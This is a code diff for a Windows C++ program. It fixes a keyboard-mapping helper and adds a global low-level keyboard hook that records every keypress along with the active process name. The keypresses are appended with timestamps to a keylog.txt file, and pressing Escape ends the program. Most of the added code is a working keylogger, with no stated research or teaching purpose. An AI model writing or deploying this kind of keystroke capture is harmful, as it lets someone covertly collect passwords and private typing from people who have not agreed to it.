@@ -14,7 +14,8 @@ std::map<UINT, std::string> createKeyboardMap()
     char keybuffer;
     for (int i = 0; i < 256; ++i)
     {
-        if (keybuffer == MapVirtualKey(UINT(i), 2))
+        keystring = "";
+        if (keybuffer = MapVirtualKey(UINT(i), 2))
         {
             keystring += keybuffer;
         }
@@ -23,7 +24,6 @@ std::map<UINT, std::string> createKeyboardMap()
             keystring = int_to_hex(i);
         }
         _keyboardMap.insert(_keyboardMap.end(), std::pair<UINT, std::string>(UINT(i), keystring));
-        keystring = "";
     }
 
     _keyboardMap[0x1B] = "ESCAPE";
@@ -86,6 +86,64 @@ std::map<UINT, std::string> createKeyboardMap()
 }
 
 
+HHOOK keyboardHook;
+std::map<UINT, std::string> keyboardMap = createKeyboardMap();
+
+std::vector<std::string> keyBuffer;
+
+
+void flush(){
+    std::ofstream myfile("../keylog.txt", std::ios::out | std::ios::app);
+    if (myfile.is_open())
+    {
+        std::time_t logTime = system_clock::to_time_t(system_clock::now());
+        myfile << std::ctime(&logTime) << "> ";
+
+        myfile << getProcName(getCurrentPID()) << ": ";
+
+        for (int i = 0; i < keyBuffer.size(); i++)
+        {
+            myfile << keyBuffer.at(i) << ' ';
+        }
+
+        myfile << '\n';
+
+        myfile.flush();
+        myfile.close();
+    } else {
+        throw std::runtime_error("Failed to open file");
+    }
+
+    keyBuffer.clear();
+}
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
+    {
+        KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;
+        
+        keyBuffer.push_back(keyboardMap[pKeyStruct->vkCode]);
+        if ((pKeyStruct->vkCode == '\n' || pKeyStruct->vkCode == '\t' || pKeyStruct->vkCode == '\r') && keyBuffer.size() > 0)
+        {
+            keyBuffer.pop_back();
+            flush();
+        } else if (pKeyStruct->vkCode == 0x1B) {
+            exit(0);
+        }
+    }
+
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+}
+
+
+void hookKeyboard() {
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), NULL);
+}
+
+void unhookKeyboard() {
+    UnhookWindowsHookEx(keyboardHook);
+}
 
 
 
